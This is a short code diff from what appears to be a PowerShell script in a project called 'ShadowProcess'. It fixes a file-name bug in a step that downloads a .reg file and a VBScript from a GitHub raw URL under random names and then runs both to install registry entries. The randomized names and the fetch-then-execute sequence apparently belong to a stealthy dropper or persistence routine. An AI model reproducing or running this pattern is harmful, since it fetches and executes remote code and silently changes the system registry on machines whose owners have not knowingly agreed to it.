@@ -41,7 +41,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/re
 
 #script visual basic confirmar reg
 $vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs".ps1
+Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #instalando registro
 ./"$reg_file.reg";"$vbs_file.vbs"
